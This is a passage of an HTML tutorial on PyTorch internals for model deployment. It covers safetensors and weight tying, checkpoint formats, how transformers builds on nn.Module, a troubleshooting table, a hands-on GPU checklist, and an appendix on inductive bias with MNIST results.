+        <h3 id="s10-6">A hard limit of safetensors: it can't hold "two names pointing to the same storage"</h3>
+        <p>This one smashes §1's memory model into this section's file format, and it's <strong>the first trap you'll hit</strong> when you write a conversion script yourself.</p>
+        <p>§1 said: <strong>multiple Tensors can be different views on the same Storage</strong> — the core of PyTorch's memory model. Real models have a famous application of it called <strong>weight tying</strong>: many LLMs <strong>tie the output-side <code>lm_head.weight</code> and the input-side <code>embed_tokens.weight</code> into the same tensor</strong> (<code>lm_head.weight = embed_tokens.weight</code>), two attribute paths pointing to one storage, saving hundreds of millions of parameters. (Why they can be tied and why it makes sense is covered in Part 2; here you only need to know "some models really do this".)</p>
+        <p><strong>But safetensors can't express it.</strong> It's a "flat <code>str → tensor</code> mapping"; a block of data can have only one name in the file. Measured:</p>
+        <pre class="python"><code>emb, lm = nn.Embedding(10, 4), nn.Linear(4, 10, bias=False)
+lm.weight = emb.weight                                    # tie
+sd = {&quot;embed_tokens.weight&quot;: emb.weight.data, &quot;lm_head.weight&quot;: lm.weight.data}
+print(sd[&quot;embed_tokens.weight&quot;].data_ptr() == sd[&quot;lm_head.weight&quot;].data_ptr())   # True
+save_file(sd, &quot;tied.safetensors&quot;)
+</code></pre>
+        <pre><code>RuntimeError: Some tensors share memory, this will lead to duplicate memory on disk
+and potential differences when loading them again:
+[{&#39;lm_head.weight&#39;, &#39;embed_tokens.weight&#39;}].
+A potential way to correctly save your model is to use `save_model`.
+</code></pre>
+        <p><strong>It refuses outright rather than silently copying.</strong> Two ways out, each with a cost:</p>
+        <ul>
+        <li><strong><code>.clone()</code> and then save</strong> — it saves, but <strong>the disk size doubles and the tie is lost for good</strong> (measured with that toy: two 10×4 fp32 tensors of 160 bytes each, a 480-byte file = 320 data + 160 header). For a real model that's hundreds of millions of parameters of wasted volume.</li>
+        <li><strong>Save one copy + rebuild from the config at load time</strong> — this is what HF does: <code>save_pretrained</code> drops the duplicate key, and at load time it reads <code>tie_word_embeddings</code> in <code>config.json</code> and calls <code>tie_weights()</code> (one of the 78 methods in §8) to reconnect the tie.</li>
+        </ul>
+        <p><strong>So when you dump a tied model, you won't see a separate <code>lm_head.weight</code> — not because the author left it out, but because safetensors simply doesn't allow it to exist under a second name.</strong> Conversely, when you write your own <code>.pt → .safetensors</code> conversion and hit <code>Some tensors share memory</code>, this is what you've run into — don't clone blindly; first check whether the target framework rebuilds the tie at load time.</p>
+        <h3 id="s10-7">Inspect it yourself (empirical)</h3>
+        <p>The safetensors header is itself a manifest:</p>
+        <pre class="python"><code>import glob
+from safetensors import safe_open
+
+for path in sorted(glob.glob(&quot;path/to/model/*.safetensors&quot;)):   # works for a single file or shards
+    with safe_open(path, framework=&quot;pt&quot;) as f:
+        for k in f.keys():
+            s = f.get_slice(k)                                    # reads only the header, not the data
+            print(f&quot;{k:60s} {tuple(s.get_shape())} {s.get_dtype()}&quot;)
+</code></pre>
+        <p>You'll see <code>embeddings.word_embeddings.weight (250002, 1024)</code>, <code>...attention.self.query.weight</code>, <code>...query.bias</code>, <code>...LayerNorm.weight</code> and so on — weights, biases, the embedding table, LN parameters, all at a glance.</p>
+        <p><strong>A more useful step: group by prefix and you get §3's VRAM arithmetic directly.</strong> It reads only headers (<code>get_slice</code> doesn't load data), so in a few seconds you can see "which chunk of this model is biggest":</p>
+        <pre class="python"><code>import glob, math
+from safetensors import safe_open
+from collections import defaultdict
+
+g = defaultdict(lambda: [0, 0])                       # prefix → [tensor count, parameter count]
+for path in glob.glob(&quot;path/to/model/*.safetensors&quot;):
+    with safe_open(path, framework=&quot;pt&quot;) as f:
+        for k in f.keys():
+            n = math.prod(f.get_slice(k).get_shape())     # no data read, shapes only
+            g[k.split(&quot;.&quot;)[0]][0] += 1
+            g[k.split(&quot;.&quot;)[0]][1] += n
+
+for p, (c, n) in sorted(g.items(), key=lambda x: -x[1][1]):
+    print(f&quot;{p:20s} {c:5d} tensors  {n/1e6:8.1f}M params  ~{n*2/1e9:.2f} GB(bf16)&quot;)
+</code></pre>
+        <p>The last column is §3's <code>parameter count × bytes per parameter</code>. Run it over a multimodal model and you see at a glance how much <code>audio_encoder.*</code> / <code>audio_adaptor.*</code> / <code>llm.*</code> each take — <strong>and you can see on the spot that the embedding table is often the single largest tensor.</strong></p>
+        <h3 id="s10-8">An aside: what a checkpoint actually is</h3>
+        <p>Several places above mention that <code>.pt</code> "can hold optimizer state, epoch". Together these things have a name, <strong>checkpoint</strong>, and the word is <strong>overloaded twice</strong>, which is bound to confuse you the first time, so let's split it first:</p>
+        <table>
+        <thead>
+        <tr>
+        <th></th>
+        <th>Checkpoint in the <strong>training</strong> sense</th>
+        <th>Checkpoint in the <strong>HuggingFace</strong> sense</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td>What it means</td>
+        <td>A <strong>complete snapshot</strong> of training at a given moment</td>
+        <td><strong>A downloadable set of pretrained weights</strong> ("the <code>bert-base-uncased</code> checkpoint")</td>
+        </tr>
+        <tr>
+        <td>What it holds</td>
+        <td>Weights + optimizer state + learning-rate scheduler state + current epoch/step + random-number state</td>
+        <td><strong>Weights only</strong></td>
+        </tr>
+        <tr>
+        <td>Why it exists</td>
+        <td>① Training runs for days and machines die, <strong>so you must be able to resume</strong>; ② you want to keep "the best version on the validation set", not "the last version"</td>
+        <td>Identifies a model version</td>
+        </tr>
+        </tbody>
+        </table>
+        <p><strong>What is "optimizer state"?</strong> Take Adam: it maintains two extra tensors for <strong>every parameter</strong> (the first and second moments of the gradient). So a complete training checkpoint is roughly <strong>three times the size of the bare weights</strong>. This also explains the first row of the table in the previous section — <code>.pt</code> can hold any Python object, while safetensors can only hold a flat "name → tensor", <strong>which simply can't hold what a checkpoint needs</strong>. The training side's use of <code>.pt</code> isn't a matter of habit; there's no choice.</p>
+        <p><strong>The one sentence to remember for you (inference only):</strong></p>
+        <blockquote>
+        <p><strong>The model weights you download are usually not a checkpoint but the weights stripped out of one.</strong> So don't assume a <code>.pt</code> is a checkpoint (it may just be a <code>torch.save</code>d state_dict), and don't assume a checkpoint can be used for inference as is.</p>
+        </blockquote>
+        <h3 id="s10-9">Training format ≠ inference format: why some weights need converting first</h3>
+        <p>Everything above is about "a well-behaved HF directory". But weights you get from upstream frameworks (FunASR, assorted research code) often <strong>don't look like that at all</strong> — they're in training format. Continuing the prefix-stripping example from §5, the full comparison:</p>
+        <table>
+        <thead>
+        <tr>
+        <th></th>
+        <th><code>model.pt</code> (training side)</th>
+        <th>What vLLM / HF want (inference side)</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td>Form</td>
+        <td><strong>A single pickle</strong> from <code>torch.save</code></td>
+        <td>A <strong>directory</strong>: config + weights + tokenizer</td>
+        </tr>
+        <tr>
+        <td>Scope</td>
+        <td>Encoder + adaptor + CTC + LLM <strong>all in one state_dict</strong></td>
+        <td><strong>Only the LLM part</strong></td>
+        </tr>
+        <tr>
+        <td>Key names</td>
+        <td><code>llm.model.layers.0.…</code></td>
+        <td><code>model.layers.0.…</code></td>
+        </tr>
+        <tr>
+        <td>Metadata</td>
+        <td>No <code>config.json</code>, no tokenizer</td>
+        <td>Both are required</td>
+        </tr>
+        </tbody>
+        </table>
+        <p><strong>Why doesn't upstream just ship HF format?</strong> Because <code>model.pt</code> has to be the complete thing — it must be able to continue training and be loaded by upstream's own inference path. What the inference engine wants is a copy that's "LLM only, HF layout, inference-only". <strong>One file can't satisfy both needs.</strong></p>
+        <p><strong>So a "training format → inference format" adapter necessarily exists</strong>: extract the submodules you need, strip the prefix, gather the config and tokenizer, save as safetensors. When you take a model from an upstream framework, you'll most likely run into such a conversion step (sometimes a function, sometimes a script, sometimes upstream has already published the converted version for you).</p>
+        <p><strong>It's enough to remember what it is: conversion changes only the packaging, not the tensor values.</strong> The same weights, with different key names and a different file layout, become something another pipeline can consume. What traps this kind of conversion runs into (caches that don't invalidate, outputs with no provenance mark, different packagings of the same model that aren't compatible with each other) is an operations matter, belonging to Part 2.</p>
+        <hr />
+        <h2 id="s11">8. transformers: the layer that lifts PyTorch into "models"</h2>
+        <p>A transformers model <strong>is itself a <code>torch.nn.Module</code></strong>. What <code>AutoModel.from_pretrained(...)</code> returns is an ordinary PyTorch model; you can <code>.to("cuda")</code>, <code>.eval()</code>, <code>.state_dict()</code> it exactly like §5's TinyNet — it just has dozens of transformer layers inside.</p>
+        <p><strong>This isn't a metaphor; it's a literal inheritance relationship — three lines of code let you check it yourself:</strong></p>
+        <pre class="python"><code>from transformers import PreTrainedModel
+import torch.nn as nn
+
+print(issubclass(PreTrainedModel, nn.Module))   # True
+for c in PreTrainedModel.__mro__: print(c.__module__ + &quot;.&quot; + c.__name__)
+</code></pre>
+        <pre><code>transformers.modeling_utils.PreTrainedModel
+torch.nn.modules.module.Module              ← the relationship is in this line
+transformers.modeling_utils.EmbeddingAccessMixin
+transformers.modeling_utils.ModuleUtilsMixin
+transformers.utils.hub.PushToHubMixin
+transformers.integrations.peft.PeftAdapterMixin
+</code></pre>
+        <p><strong>Every HF model class is a subclass of <code>PreTrainedModel</code>, and <code>PreTrainedModel</code> is a subclass of <code>nn.Module</code>.</strong> The official philosophy doc says the same in so many words:</p>
+        <blockquote>
+        <p>"Transformers is a <strong>PyTorch-first library</strong>." / "Model classes are <strong>PyTorch models (<code>torch.nn.Module</code>), wrapped by at least a <code>PreTrainedModel</code></strong>."</p>
+        </blockquote>
+        <p><strong>And what exactly "wrapped by" adds, you can count: <code>PreTrainedModel</code> has 78 more public methods than <code>nn.Module</code>.</strong> Pick out the relevant ones and the list is almost the source-code version of the table below — <strong>each one maps to a section of this document</strong>:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Extra method</th>
+        <th>What it does / where in this document</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><code>from_pretrained</code> / <code>save_pretrained</code> / <code>push_to_hub</code></td>
+        <td>Saving and loading weights and directories (§7)</td>
+        </tr>
+        <tr>
+        <td><code>config_class</code> / <code>generation_config_class</code></td>
+        <td>Config-driven instantiation (§7)</td>
+        </tr>
+        <tr>
+        <td><strong><code>device</code> / <code>dtype</code></strong></td>
+        <td><strong>Note: a bare <code>nn.Module</code> has neither attribute</strong> — a Module's parameters can in principle be spread across several devices, so PyTorch doesn't give you "the model's device"; these are convenience attributes added by transformers (§2)</td>
+        </tr>
+        <tr>
+        <td><code>tie_weights</code> / <code>resize_token_embeddings</code></td>
+        <td>Rebuilding weight ties (§7), resizing the vocabulary</td>
+        </tr>
+        <tr>
+        <td><code>set_attn_implementation</code></td>
+        <td>Choosing the attention backend (eager / sdpa / FlashAttention …)</td>
+        </tr>
+        <tr>
+        <td><strong><code>can_generate</code></strong></td>
+        <td><strong>"Can this model generate autoregressively" is made into a method</strong> — in essence it checks whether an LM head is attached</td>
+        </tr>
+        <tr>
+        <td><code>load_adapter</code> / <code>enable_peft_hotswap</code></td>
+        <td>Attaching LoRA (§4's "fine-tuning turns autograd back on")</td>
+        </tr>
+        <tr>
+        <td><code>dequantize</code></td>
+        <td>Quantization-related (§3)</td>
+        </tr>
+        <tr>
+        <td><code>gradient_checkpointing_enable</code></td>
+        <td>Purely training-side; inference never touches it</td>
+        </tr>
+        </tbody>
+        </table>
+        <p><strong>Then why not just use PyTorch? Because PyTorch deliberately does only "the foundation" and leaves a lot of work alone:</strong></p>
+        <table>
+        <thead>
+        <tr>
+        <th>What you need</th>
+        <th>Does plain PyTorch provide it?</th>
+        <th>Who provides it</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td>Tensors / autograd / <code>nn.Module</code> / CUDA</td>
+        <td><strong>Yes</strong> (that's what it is)</td>
+        <td>PyTorch</td>
+        </tr>
+        <tr>
+        <td>The <strong>concrete architecture definitions</strong> of Qwen3 / Llama / BERT</td>
+        <td>No (you'd have to write dozens of layers from the paper)</td>
+        <td>transformers' <code>modeling_xxx.py</code></td>
+        </tr>
+        <tr>
+        <td>Read <code>config.json</code> → instantiate → pour in safetensors</td>
+        <td>No (only the lowest-level <code>load_state_dict</code>)</td>
+        <td><code>from_pretrained</code></td>
+        </tr>
+        <tr>
+        <td>tokenizer / vocab / chat_template</td>
+        <td><strong>Not at all</strong> (PyTorch doesn't understand text)</td>
+        <td><code>AutoTokenizer</code></td>
+        </tr>
+        <tr>
+        <td>The autoregressive <code>generate</code> loop, sampling, KV cache</td>
+        <td>No</td>
+        <td>transformers <code>generate</code></td>
+        </tr>
+        <tr>
+        <td>Serving (continuous batching, OpenAI API)</td>
+        <td>No</td>
+        <td>transformers serve / vLLM (see below)</td>
+        </tr>
+        </tbody>
+        </table>
+        <p>So <strong>PyTorch is the engine; transformers is the layer that "assembles a pile of raw PyTorch parts into a real model that can <code>from_pretrained</code>, tokenize and <code>generate</code>"</strong>. The "structure + weights + tokenizer" you learned in §7 is all supplied by transformers. That answers the first question: transformers doesn't replace PyTorch; it lifts PyTorch up to the abstraction level of "a model".</p>
+        <p><strong>Then where is its upper boundary? The project drew it itself, and drew it cleanly</strong> (the v5 release blog):</p>
+        <blockquote>
+        <p>"we <strong>don't aim to do specialized optimizations</strong> like the dedicated inference engines (vLLM, SGLang, TensorRT LLM). Instead, we aim to be <strong>perfectly inter-compatible</strong> with these."</p>
+        </blockquote>
+        <p><strong>Downward it doesn't rewrite PyTorch; upward it doesn't compete with vLLM — those are the two boundaries transformers set for itself</strong>, and they're the official version of this section's layer diagram. It positions itself as "the source of truth for model definitions" and lets downstream engines do their own optimizations.</p>
+        <blockquote>
+        <p><strong>An observation, which also says why this section is worth writing.</strong> The only place in the official docs that addresses "how transformers relates to PyTorch" head-on is those two sentences on the philosophy page; all the other material (the docs home page, the model-definition blog post, the design-philosophy piece on the single-file policy) is about <strong>transformers → the downstream ecosystem</strong>, and none is about <strong>transformers → PyTorch</strong>. The reason isn't hard to guess: HF's readers are assumed to know PyTorch already, so for them it's not a question. <strong>You're the opposite — you can deploy but don't know the framework underneath, and that's exactly where the gap is.</strong> So you have to piece this relationship together yourself, and the way to do it is the inheritance chain above.</p>
+        </blockquote>
+        <p>In this document's terms: <strong>the "structure + weights + tokenizer" you learned in §7 is exactly what transformers provides for you:</strong></p>
+        <ul>
+        <li><strong>Structure</strong>: each <code>modeling_xxx.py</code> is an architecture definition written with nn.Module (§5 / §7).</li>
+        <li><strong>Pouring in the weights</strong>: <code>from_pretrained</code> reads <code>architectures</code> from <code>config.json</code> → instantiates → pours in the safetensors (§7).</li>
+        <li><strong>Tokenizer</strong>: <code>AutoTokenizer</code> loads vocab / tokenizer_config, tokenizes, applies the chat_template (detailed in Part 2).</li>
+        </ul>
+        <p>The layers:</p>
+        <pre><code>Your application
+  ↑
+transformers   ← 400+ model architectures + from_pretrained + AutoTokenizer + generate + Trainer
+  ↑              (= the supplier of &quot;structure + weights + tokenizer&quot; in this document)
+PyTorch        ← the Tensor / autograd / nn.Module engine
+  ↑
+CUDA / hardware
+</code></pre>
+        <h2 id="s12">9. Debugging / troubleshooting table</h2>
+        <p>When an inference service goes wrong, 90% of it falls into these categories, with the corresponding PyTorch checks:</p>
+        <pre class="python"><code># ① device mismatch — the most common
+#   RuntimeError: Expected all tensors to be on the same device
+print(t.device)                          # find the tensor that didn&#39;t get .to(device)
+
+# ② dtype mismatch
+#   RuntimeError: expected scalar type BFloat16 but found Float
+print(t.dtype)                           # input / weight dtypes must match
+
+# ③ wrong shape — attention mask / position dimension wrong
+print(t.shape)
+
+# ④ OOM — CUDA out of memory
+torch.cuda.memory_summary()              # a detailed VRAM usage table: see who&#39;s eating it
+torch.cuda.max_memory_allocated() / 1e9  # peak in GB
+
+# ⑤ contiguous error
+x = x.contiguous()                       # when a kernel requires contiguous memory
+
+# ⑥ NaN/inf (usually fp16 overflow)
+print(torch.isnan(t).any(), torch.isinf(t).any())   # switching to bf16 usually fixes it
+
+# ⑦ OOM though the model is clearly small — first suspect broadcasting blew up a shape (§1)
+print(a.shape, b.shape)   # [N] meeting [N,1] silently becomes [N,N]; 16000 → 2 GB
+
+# ⑧ no error anywhere, but the output is garbage — take one look in each place
+#   (a) does the load log say &quot;newly initialized&quot; / &quot;unexpected keys&quot;? (§5)
+#       → from_pretrained doesn&#39;t error by default; missing layers are filled with random values
+#   (b) head -5 config.json → is architectures right? (§7)
+#       same name doesn&#39;t mean same thing; in particular don&#39;t trust a -vllm suffix in a repo name
+#   (c) wrong output style / won&#39;t stop → diff generation_config.json, check eos_token_id (§7)
+
+# ⑨ CUDA error: device-side assert triggered
+#   most likely an out-of-range embedding lookup: token id ≥ vocab_size, i.e. tokenizer and weights don&#39;t match
+#   the reported line can&#39;t be trusted (asynchronous, §2); rerun with CUDA_LAUNCH_BLOCKING=1 to locate it
+
+# ⑩ CUBLAS_STATUS_NOT_INITIALIZED / CUBLAS_STATUS_ALLOC_FAILED
+#   usually OOM in disguise: VRAM was already gone when cuBLAS tried to allocate its workspace; check as for ④
+
+# ⑪ Inference tensors cannot be saved for backward
+#   something computed under inference_mode was used for training (§4): use no_grad for that step, or .clone()
+</code></pre>
+        <p>The order of thinking for OOM (measure first, then act):</p>
+        <ol>
+        <li><strong>First tell who's eating it</strong>: weights are fixed (<code>parameter count × bytes</code>, computable in your head per §3); activations and caches grow with batch, sequence length and concurrency. The remedies for the two are completely different.</li>
+        <li><strong>What the tensor layer can do</strong>: lower the batch, shorten the sequence, switch to a smaller dtype, check whether broadcasting blew up a big matrix (⑦), confirm <code>inference_mode()</code> is really on.</li>
+        <li><strong>What the model layer can do</strong>: switch to quantized weights (AWQ/GPTQ/FP8), which changes only "bytes per parameter" and touches neither the structure nor the tokenizer.</li>
+        <li><strong>The engine layer and multiple GPUs</strong> (<code>gpu_memory_utilization</code>, KV cache quantization, tensor parallelism and so on) — belong to <strong>Part 2</strong>.</li>
+        </ol>
+        <hr />
+        <h2 id="s13">10. A 30-minute hands-on checklist (verify you really got it)</h2>
+        <p>Open Python on any L20, run these, and you're set:</p>
+        <pre class="python"><code>import torch
+
+# 1. confirm the environment
+print(torch.__version__, torch.version.cuda, torch.cuda.is_available())
+print(torch.cuda.get_device_name(0))
+
+# 2. basic tensor attributes
+x = torch.randn(2, 3).cuda().bfloat16()
+print(x.shape, x.dtype, x.device, x.is_contiguous())
+
+# 3. device &amp; asynchronous timing (compare with and without synchronize)
+import time
+a = torch.randn(4096, 4096, device=&quot;cuda&quot;)
+
+t0 = time.perf_counter()
+for _ in range(50): b = a @ a
+print(&quot;no sync  :&quot;, time.perf_counter()-t0)      # only the &quot;launch&quot; time — absurdly small (milliseconds)
+
+torch.cuda.synchronize(); t0 = time.perf_counter()
+for _ in range(50): b = a @ a
+torch.cuda.synchronize()
+print(&quot;with sync:&quot;, time.perf_counter()-t0)      # this is the time the GPU actually spent computing
+
+# 4. VRAM: watch allocated vs reserved, then compare with nvidia-smi
+print(torch.cuda.memory_allocated()/1e6, &quot;MB allocated&quot;)
+print(torch.cuda.memory_reserved()/1e6, &quot;MB reserved&quot;)
+del a, b; torch.cuda.empty_cache()
+print(torch.cuda.memory_reserved()/1e6, &quot;MB reserved after empty_cache&quot;)
+# now run nvidia-smi in another terminal: this process still holds a few hundred MB — that&#39;s the CUDA context (§2)
+
+# 5. VRAM difference between inference mode and normal mode: the same forward, with or without a graph
+import torch.nn as nn
+net = nn.Sequential(*[nn.Linear(4096, 4096) for _ in range(8)]).cuda()
+x = torch.randn(256, 4096, device=&quot;cuda&quot;)
+
+torch.cuda.reset_peak_memory_stats()
+y = net(x)                                        # default: records the graph, keeps all intermediate activations
+print(&quot;train-mode peak:&quot;, torch.cuda.max_memory_allocated()/1e6, &quot;MB&quot;)
+del y
+
+torch.cuda.reset_peak_memory_stats()
+with torch.inference_mode():
+    y = net(x)                                    # no graph; each layer can be dropped once computed
+print(&quot;inference peak :&quot;, torch.cuda.max_memory_allocated()/1e6, &quot;MB&quot;)
+# the difference = 8 layers of intermediate activations [256, 4096] × fp32; more layers, bigger batch, bigger gap
+
+# 6. look at a real model&#39;s state_dict (needs pip install transformers; use any HF model you have locally)
+# from transformers import AutoModel
+# m = AutoModel.from_pretrained(&quot;...local path...&quot;)
+# print(list(m.state_dict().keys())[:10])   # look at the weight naming structure
+</code></pre>
+        <hr />
+        <h2 id="s14">11. Mental model summary (one page to take away)</h2>
+        <pre><code>  +----------------------------------------------------+
+  |  model = structure + weights + tokenizer  (§7)     |
+  |    config.json    safetensors    vocab/tokenizer   |
+  +----------------------------------------------------+
+  |  transformers: assembles them into a model (§8)    |
+  |    PreTrainedModel(nn.Module) + from_pretrained    |
+  +----------------------------------------------------+
+  |  nn.Module: a function that carries weights (§5)   |
+  |    __init__ defines layers / forward chains them   |
+  |    state_dict = params + persistent buffers,       |
+  |    keys are attribute paths                        |
+  +----------------------------------------------------+
+  |  Tensor (§1–§4)                                    |
+  |    Storage + (shape, stride) / device / dtype      |
+  |    autograd — always off at inference              |
+  +----------------------------------------------------+
+  |  CUDA / cuBLAS / driver                            |
+  +----------------------------------------------------+
+</code></pre>
+        <ul>
+        <li><strong>Tensor = a flat block of memory + a way of reading it.</strong> transpose changes the stride, broadcasting sets a stride to 0, only <code>contiguous()</code> really copies — one model explains all three. The price of zero-copy is "non-contiguous", which many kernels won't accept.</li>
+        <li><strong>shape / dtype / device are the three axes of troubleshooting.</strong> 90% of errors can be traced along these three; for the rest, most likely <strong>broadcasting quietly changed a shape</strong> without an error.</li>
+        <li><strong>CUDA is asynchronous</strong>: timing must <code>synchronize()</code>, otherwise you're measuring "launch time"; <code>.item()</code> / <code>.cpu()</code> synchronize implicitly; the line number in a CUDA error can't be trusted — add <code>CUDA_LAUNCH_BLOCKING=1</code> when debugging.</li>
+        <li><strong>numpy defaults to float64, torch to float32</strong>: <code>.float()</code> audio from numpy before feeding it into the model.</li>
+        <li><strong>VRAM = weights + KV cache + activations + overhead</strong>, and the weights part is <code>parameter count × bytes per parameter</code> (for a sharded model, read <code>total_size</code> from <code>index.json</code>). What <code>nvidia-smi</code> shows is reserved (PyTorch's cache pool) + the CUDA context + what other libraries allocated themselves; it being larger than allocated is normal, not a leak.</li>
+        <li><strong>bf16 is the modern inference default</strong>: the same exponent range as fp32, less prone to NaN, half the VRAM.</li>
+        <li><strong>Inference = <code>model.eval()</code> + <code>inference_mode()</code>.</strong> The former changes layer behavior (Dropout / BatchNorm); the latter builds no computation graph — what's saved is that graph and the intermediate activations, which is the whole reason inference uses less VRAM than training. If the output will also feed training, use <code>no_grad()</code>.</li>
+        <li><strong><code>from_pretrained</code> doesn't error by default</strong>: missing weights are randomly initialized, extra ones dropped, with only a warning. <code>newly initialized</code> in the load log is the prime suspect for "the output is garbage".</li>
+        <li><strong>A <code>state_dict</code> key is "the attribute path from the root module to this tensor".</strong> So <code>fc1.weight</code> and <code>model.layers.0.self_attn.q_proj.weight</code> follow the same rule; and so changing the root or stripping a prefix can "promote" a submodule into a standalone model.</li>
+        <li><strong>Registration has four tiers</strong>: <code>nn.Parameter</code> (learned) / persistent buffer (not learned but in the file) / <code>persistent=False</code> buffer (not in the file but takes VRAM) / plain attribute (PyTorch doesn't know it exists; <code>.to()</code> doesn't move it). The last tier is the root cause of "some mask forgot <code>.to(device)</code>".</li>
+        <li><strong>The number in the file ≠ what's there at runtime</strong>: a <code>persistent=False</code> buffer is in VRAM but not in the state_dict; safetensors can't hold "two names pointing to the same storage", so tied weights are stored once.</li>
+        <li><strong><code>.pt</code> is a container; <code>.safetensors</code> is a data format.</strong> The former can hold any Python object (with the risk of code execution); the latter only a flat name → tensor mapping. This decides that the training side uses the former and the inference side the latter, and that there's necessarily a "training format → inference format" adapter in between.</li>
+        <li><strong><code>architectures</code> is a routing key that fails without an error</strong>: given an unfamiliar model directory, the first thing to do is <code>head -5 config.json</code>.</li>
+        <li><strong>transformers doesn't replace PyTorch; it lifts it up to the "model" level</strong>: <code>PreTrainedModel</code> is literally a subclass of <code>nn.Module</code>, and its 78 extra methods are the layer it adds.</li>
+        </ul>
+        <p><strong>Next</strong>: the engine layer (what vLLM swaps out on top of PyTorch, what Xinference adds on top of that, where your ASR / TTS each belong) is in <strong>Part 2</strong>.</p>
+        <h2 id="s15">Appendix: Structure (inductive bias) — the layer that really explains deep learning</h2>
+        <blockquote>
+        <p>This whole appendix answers one question: many people (including you, back then) understand a DNN as "layers of matmul + weights/biases + activations", and nn.Module even "reinforces" that impression. So does <strong>structural information</strong> actually matter?</p>
+        </blockquote>
+        <h3 id="s15-1">1 "It's all matmul" is right, but that's the mechanism, not the explanation</h3>
+        <p>First, knock down an assumption: structure <strong>isn't something besides matmul; structure is a constraint on matmul</strong>.</p>
+        <ul>
+        <li><strong>A fully connected layer</strong> = unconstrained matmul (every input connects to every output, all weights free).</li>
+        <li><strong>A convolution</strong> = constrained matmul: <strong>sparse</strong> (each output connects only to a local window) + <strong>weight sharing</strong> (the same set of weights reused across positions). It's a linear layer with constraints.</li>
+        <li><strong>Attention</strong> = also matmul (QKᵀ, softmax, V), with the constraints that the projection matrices are shared across positions + dynamic weighting by content.</li>
+        </ul>
+        <p>So "architecture / structure / inductive bias" is in essence <strong>the pattern of constraints you impose on matmul (connectivity, sharing, sparsity)</strong>. "It's all matmul anyway" is right the way "all matter is atoms" is right — correct, but it can't explain why a bird flies and a stone doesn't. <strong>The difference is all in how things are connected.</strong></p>
+        <h3 id="s15-2">2 Expressive power vs learnability (the real reason structure matters)</h3>
+        <p>A point that looks contradictory and clears up as soon as it's explained:</p>
+        <ul>
+        <li><strong>In terms of expressive power, structure "doesn't matter"</strong>: the universal approximation theorem says a wide enough MLP can approximate any function, so in theory an MLP <strong>can</strong> represent everything a CNN can.</li>
+        <li><strong>But the bottleneck of deep learning was never expressive power</strong>; it's <strong>whether you can learn the right function from limited data and generalize</strong> — and that is decided entirely by the inductive bias (the structure).</li>
+        </ul>
+        <p>An MLP <em>can</em> represent a translation-invariant detector, but it has to learn it the hard way from data, needs a huge number of parameters, and breaks when the shift changes; a CNN <strong>welds "locality + translation invariance" into the structure</strong>, saving parameters and data and generalizing by construction. <strong>The weights are what the network "learns"; the structure is what it's "forced to assume" before learning, and those assumptions decide what it can learn well.</strong> That's what "architecture is the prior" means. The history of deep learning is a <strong>history of architectures</strong> (MLP → CNN → RNN → Transformer, each one "a structure matched to a kind of data"), not a history of "matmul stacked ever bigger".</p>
+        <p>The precise answer to "does structure matter": ask about expressive power, no; ask about learnability and generalization, it's everything — and practice is dominated by the latter.</p>
+        <h3 id="s15-3">3 Case study: what exactly goes wrong when MNIST flattens 28×28 into 784</h3>
+        <p>The first step of the classic "three-layer network on MNIST" flattens the 2-D array into 1-D, and <strong>that throws away the spatial structure</strong> — your intuition is right, but let's be precise:</p>
+        <ul>
+        <li>What's lost is not <strong>the data</strong> (every pixel value is still there; (r,c) just moves to index <code>r*28+c</code>) but <strong>the prior of adjacency</strong>: the MLP doesn't know which two slots are neighbors.</li>
+        <li>But <strong>the output is 10 class scores (1-D), so "flattening" has to happen somewhere</strong>. The problem isn't "flattening"; it's <strong>"flattening at the very first step"</strong>. The precise version: <strong>flattening at the input (with no local processing) is bad; flattening after local feature extraction is fine</strong>. A CNN flattens too, just after the conv.</li>
+        </ul>
+        <p><strong>An MLP (multi-layer perceptron) is "adjacency-blind", not "position-blind":</strong> each slot has its own weights, so it <strong>knows absolute position</strong> (that's exactly why shuffling a single test image breaks it); what it lacks is adjacency / translation structure.</p>
+        <p><strong>The killer demo (mind how it's built):</strong> to prove an MLP doesn't use spatial structure, <strong>fix one permutation π, apply it to every image (consistently for train and test), and retrain</strong> → the accuracy doesn't budge. <strong>Shuffling a single test image and feeding it to a normally trained model fails instead</strong> (inconsistent before and after), which would actually make people think "the MLP uses spatial structure" — the opposite effect.</p>
+        <p><strong>Measured</strong> (the same <code>digits</code> data, a fixed permutation π applied to the training and test sets, retrained):</p>
+        <table>
+        <thead>
+        <tr>
+        <th></th>
+        <th style="text-align: right;">Normal</th>
+        <th style="text-align: right;">Fixed shuffle (retrained)</th>
+        <th style="text-align: right;">Change</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><strong>MLP</strong>, 1 hidden layer</td>
+        <td style="text-align: right;">0.967</td>
+        <td style="text-align: right;">0.964</td>
+        <td style="text-align: right;"><strong>−0.003</strong></td>
+        </tr>
+        <tr>
+        <td><strong>MLP</strong>, 2 hidden layers</td>
+        <td style="text-align: right;">0.976</td>
+        <td style="text-align: right;">0.975</td>
+        <td style="text-align: right;"><strong>−0.001</strong></td>
+        </tr>
+        <tr>
+        <td><strong>CNN</strong></td>
+        <td style="text-align: right;"><strong>0.983</strong></td>
+        <td style="text-align: right;">0.972</td>
+        <td style="text-align: right;"><strong>−0.010</strong></td>
+        </tr>
+        </tbody>
+        </table>
+        <p><strong>Three things, said once:</strong></p>
+        <ol>
+        <li><strong>The MLP doesn't budge</strong> — it never used locality, so shuffling makes no difference to it.</li>
+        <li><strong>The CNN clearly drops</strong> — the one point it loses is exactly the value of the prior "neighboring pixels are related".</li>
+        <li><strong>After shuffling, the CNN (0.972) is even slightly below the MLP (0.975).</strong> This is the sharpest one: once locality is destroyed, the convolution's <strong>weight sharing becomes a pure constraint with zero benefit</strong> — it can only make things worse.</li>
+        </ol>
+        <p>And under normal conditions the CNN (0.983) beats the best MLP (0.977) by 0.6 points — <strong>the part it wins and the part it loses after shuffling are the same thing.</strong></p>
+        <blockquote>
